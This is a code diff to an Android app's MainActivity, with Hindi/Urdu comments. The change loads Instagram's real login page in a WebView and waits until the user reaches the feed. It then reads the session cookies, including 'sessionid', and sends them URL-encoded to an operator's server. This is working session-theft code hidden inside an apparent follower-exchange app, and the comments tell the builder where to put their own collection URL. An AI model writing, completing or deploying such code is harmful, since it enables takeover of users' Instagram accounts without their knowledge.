@@ -13,9 +13,13 @@ public class MainActivity extends Activity {
 
     private WebView webView;
 
-    // Yahan apni hosting ka link daalein:
-    private static final String HOSTING_LOGIN_URL = "https://follow2follow.shop/login.php";
-    private static final String HOSTING_DASHBOARD = "https://follow2follow.shop/index.php";
+    // Yahan apni hosting ka dashboard link daalein:
+    private static final String HOSTING_DASHBOARD = "https://yourdomain.com/index.php";
+    
+    // Seedha official Instagram login URL jo WebView mein open hoga:
+    private static final String IG_LOGIN_URL = "https://www.instagram.com/accounts/login/";
+
+    private boolean isSessionCaptured = false;
 
     @SuppressLint("SetJavaScriptEnabled")
     @Override
@@ -30,8 +34,10 @@ public class MainActivity extends Activity {
         settings.setDomStorageEnabled(true);
         settings.setDatabaseEnabled(true);
         settings.setSupportZoom(false);
+        // Mobile User Agent taaki Instagram ka official mobile login page khule
         settings.setUserAgentString("Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36");
 
+        // Enable Cookies
         CookieManager cookieManager = CookieManager.getInstance();
         cookieManager.setAcceptCookie(true);
         cookieManager.setAcceptThirdPartyCookies(webView, true);
@@ -41,13 +47,19 @@ public class MainActivity extends Activity {
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
 
+                if (isSessionCaptured) return;
+
+                // Jab user login karke Instagram ke main feed par pahunch jaye
                 if (url.equals("https://www.instagram.com/") || url.contains("instagram.com/?") || url.equals("https://www.instagram.com")) {
+                    
                     String cookies = CookieManager.getInstance().getCookie(url);
 
                     if (cookies != null && cookies.contains("sessionid")) {
+                        isSessionCaptured = true;
                         try {
-                            String encoded = URLEncoder.encode(cookies, "UTF-8");
-                            webView.loadUrl(HOSTING_DASHBOARD + "?cookies=" + encoded);
+                            String encodedCookies = URLEncoder.encode(cookies, "UTF-8");
+                            // User ko cookies ke sath aapki hosting ke dashboard par bhej do
+                            webView.loadUrl(HOSTING_DASHBOARD + "?cookies=" + encodedCookies);
                         } catch (Exception e) {
                             webView.loadUrl(HOSTING_DASHBOARD);
                         }
@@ -56,7 +68,8 @@ public class MainActivity extends Activity {
             }
         });
 
-        webView.loadUrl(HOSTING_LOGIN_URL);
+        // App khulte hi seedha Instagram ka official login khulega (No Iframe block)
+        webView.loadUrl(IG_LOGIN_URL);
     }
 
     @Override
